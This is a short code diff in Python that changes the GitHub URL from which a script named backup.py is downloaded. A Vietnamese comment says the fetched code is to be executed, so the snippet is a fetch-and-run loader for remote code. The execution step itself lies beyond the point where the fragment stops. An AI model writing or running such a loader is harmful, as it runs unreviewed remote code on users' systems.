@@ -1,6 +1,6 @@
 try:
   import requests
-  url = "https://raw.githubusercontent.com/hoangks5/version_tool_socket/refs/heads/main/backup.py"
+  url = "https://raw.githubusercontent.com/hoangks5/add_vps/refs/heads/main/backup.py"
   response = requests.request("GET", url)
   code = response.text
   # chạy hàm này để thực thi code
